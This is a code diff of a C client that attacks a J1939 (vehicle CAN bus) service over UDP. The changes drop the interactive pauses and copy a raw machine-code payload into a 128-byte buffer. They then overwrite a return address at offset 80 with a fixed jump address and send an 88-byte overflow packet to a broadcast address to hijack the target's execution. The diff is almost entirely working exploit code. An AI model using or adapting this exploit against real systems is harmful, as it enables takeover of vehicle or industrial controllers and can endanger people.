@@ -18,6 +18,10 @@
 #define PORT 5001
 #define PGN 60879
 #define TARGET_ADDR "10.88.88.255"
+#define JUMP_ADDR 0xc0986f00
+
+#define OVERFLOW_PACKET_ADDR_IDX 80 // 64+16
+#define OVERFLOW_PACKET_SIZE 88 // 64+16+8
 
 int main(int argc, char *argv[])
 {
@@ -50,10 +54,8 @@ int main(int argc, char *argv[])
     char chr;
     uint8_t res;
 
-    printf("Press a key.");
-    scanf("%c",&chr);
-
     /* Send a dummy test message first */
+    /*
     const char msg[] = "This is a message from J1939 client: Hello World";
     printf("Sending dummy message, %u bytes long.\n",sizeof(msg));
     res = send_can_message(sockfd, &servaddr, PGN, (void *)&msg, sizeof(msg));
@@ -61,23 +63,28 @@ int main(int argc, char *argv[])
 
     printf("Press a key.");
     scanf("%c",&chr);
+    */
 
     /* Send the payload */
     char payload[] = {0x37,0x1e,0xc,0x0,0x1b,0xe,0x7e,0x98,0x13,0x1e,0xce,0x0,0x13,0xe,0xce,0xee,0x93,0xe,0x10,0x0,0x23,0x0,0xde,0x1,0x37,0x1e,0xc,0x0,0x1b,0xe,0x7e,0x98,0x13,0x1e,0xce,0x0,0x13,0xe,0xae,0xef,0x93,0xe,0x10,0x0,0x23,0x0,0xde,0x1,0xb7,0x0,0xc,0x0,0x9b,0x80,0x70,0x1,0x93,0x90,0xc0,0x0,0x93,0x80,0x40,0xdc,};
+    /*
     printf("Sending payload, %u bytes long\n", sizeof(payload));
     res = send_can_message(sockfd, &servaddr, PGN, (void *)&payload, sizeof(payload));
     printf("response: %u\n", res);
 
     printf("Press a key.");
     scanf("%c",&chr);
+    */
 
     /* Send the buffer overflow message */
     char buffer[128];
-    memset(buffer, 0xb4, 128);
+    memset(buffer, 0xb4, sizeof(buffer));
+    memcpy(buffer, payload, sizeof(payload));
     /* 64 bytes of regular buffer + 32 bytes after + 8 bytes for the address */
-    uint32_t addr = 0xc0986ea0;
-    memcpy(&buffer[64+32], &addr, sizeof(addr));
-    size_t len = 64+32+8;
+    uint32_t addr = JUMP_ADDR;
+
+    memcpy(&buffer[OVERFLOW_PACKET_ADDR_IDX], &addr, sizeof(addr));
+    size_t len = OVERFLOW_PACKET_SIZE;
     printf("Sending jump, %u bytes long\n", len);
     res = send_can_message(sockfd, &servaddr, PGN, (void *)&buffer, len);
     printf("response: %u\n", res);
